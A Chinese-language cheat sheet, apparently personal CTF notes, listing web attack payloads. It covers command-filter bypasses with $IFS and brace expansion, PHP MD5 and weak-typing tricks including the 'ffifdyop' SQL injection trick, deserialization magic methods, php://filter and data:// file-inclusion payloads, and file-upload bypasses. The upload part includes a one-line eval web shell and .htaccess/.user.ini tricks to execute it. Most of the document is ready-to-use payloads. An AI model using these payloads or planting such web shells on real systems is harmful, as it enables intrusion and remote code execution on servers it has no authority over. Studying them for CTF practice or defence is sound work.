### 绕过技巧



https://blog.csdn.net/weixin_39190897/article/details/116247765

这篇文章很不错

`其他内容见 SQL-Injection.md`





##### 空格被过滤

$IFS为linux中的空格

```
${IFS}$9
{IFS}
$IFS
${IFS}
$IFS$1 //$1改成$加其他数字貌似都行
IFS
< 
<> 
{cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来
%20   (space)
%09   (tab)
X=$'cat\x09./flag.php';$X       （\x09表示tab，也可以用\x20）

```

###### 内联绕过

```
cat$IFS$9`ls`
ls结果是index.php flag.php

反引号把输出内容作为输入
结果就是index.php flag.php的内容了。
```

##### 注释符被过滤

```

```

##### php弱类型

```
md5('240610708') == md5('QNKCDZO')
a!=b 但md5(1)=md5(b)
```

##### md5绕过



ffifdyop

```
select * from 'admin' where password=md5($pass,true)

pass=ffifdyop
经过md5加密后：276f722736c95d99e921722cf9ed621c

再转换为字符串：'or'6<乱码>  即  'or'66�]��!r,��b
```

###### md5强碰撞

```
if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
```

考的是MD5强碰撞，如果传参不是字符串，而是数组，md5()函数无法解出数值，就会得到===强比较的值相等

```
a=QNKCDZO
b=s878926199a

param1[]=1&param2[]=2
```

绕过is_numeric 

```
1234567a
```



### 反序列化

##### php反序列化

###### 缩写对应类型

```
缩写对应类型
a - array         b - boolean
d - double         i - integer
o - common object     r - reference
s - string         C - custom object
O - class         N - null
R - pointer reference   U - unicode string
```

###### serialize()

```
序列化后 
O:4:"User":2:{s:3:"age";i:20;s:4:"name";s:4:"daye";}
对象类型：长度：“类名”：类中变量个数：{类型：长度：“变量名”;值类型:值;类型：长度：“变量名”;值类型：值}
```

###### unserialize()

```
反序列化
```

###### 魔法函数

__双下划线开头被称为魔法函数

```
__construct  当一个对象创建时被调用，
__destruct  当一个对象销毁时被调用，
__toString  当一个对象被当作一个字符串被调用。
__wakeup()  使用unserialize时触发
__sleep()  使用serialize时触发
__destruct()  对象被销毁时触发
__call()  在对象上下文中调用不可访问的方法时触发
__callStatic()  在静态上下文中调用不可访问的方法时触发
__get()  用于从不可访问的属性读取数据
__set()  用于将数据写入不可访问的属性
__isset()  在不可访问的属性上调用isset()或empty()触发
__unset()   在不可访问的属性上使用unset()时触发
__toString()  把类当作字符串使用时触发,返回值需要为字符串
__invoke()  当脚本尝试将对象调用为函数时触发
```

其他魔法函数 具体见https://www.php.net/manual/zh/language.oop5.magic.php

### 文件包含 

##### 

#### php伪协议

```
file://
http://
ftp://
php://
zip://
data://
.
.
```

##### php://输入输出流



##### php://filter

需要开启allow_url_fopen,不需要开启allow_url_include

###### 转换过滤器

```
?filename=php://filter/convert.x/resource=flag.php
x替换为编码
x=
{
base64-encode
base64-decode
quoted-printable-encode
quoted-printable-decode

iconv.(input encoding).(output encoding)
iconv.(input encoding)/(output encoding)
iconv{
UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*}
}



}
```

##### data://

使用data:// 伪协议写入文件

```
text=data://text/plain;base64，base64后的字符串
```



### 文件上传

参考https://blog.csdn.net/admin18310911366/article/details/107998925#t9

更详细点

##### 一句话

```
<?php @eval($_POST['ac']); ?>
```



##### 标签绕过

```
php标签被绕过
还有以下几种写法
<?php ?>
<??>
<%%>
<script language="php"></script>



<% @eval($_POST['cmd']); %>
<? @eval($_POST['cmd']); ?>
```

##### Content-Type绕过

1.

```
gif文件头
GIF98a
```

2.改Content-Type

##### 后缀绕过

```
php php5 php7 phtml

或者大小写
.PHP  .pHtml
```

```
1.PHP
```

##### 空格绕过

```
在php后面添加空格
```

##### .htaccess

https://blog.csdn.net/solitudi/article/details/116666720



```
SetHandler application/x-httpd-php
AddType application/x-httpd-php .jpg
```

传完之后传一个图片马

##### .user.ini

`.user.ini`使用范围很广，不仅限于 Apache 服务器，同样适用于 [Nginx](https://so.csdn.net/so/search?q=Nginx&spm=1001.2101.3001.7020) 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。

https://blog.csdn.net/cosmoslin/article/details/120793126

需要.user.ini所在目录存在php文件



```
auto_prepend_file = <filename>         //包含在文件头
auto_append_file =s <filename>          //包含在文件尾
```



### php

##### php标签的几种写法

```
<?php ?>
<??>
<%%>
<script language="php"></script>
```

